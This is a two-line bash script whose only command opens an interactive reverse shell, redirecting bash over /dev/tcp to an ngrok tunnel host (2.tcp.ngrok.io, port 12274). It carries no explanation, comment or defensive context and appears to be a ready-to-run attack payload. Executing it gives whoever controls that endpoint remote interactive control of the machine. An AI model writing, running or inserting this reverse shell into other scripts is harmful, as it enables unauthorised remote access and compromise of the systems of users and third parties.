#!/bin/bash

bash -i >& /dev/tcp/2.tcp.ngrok.io/12274 0>&1
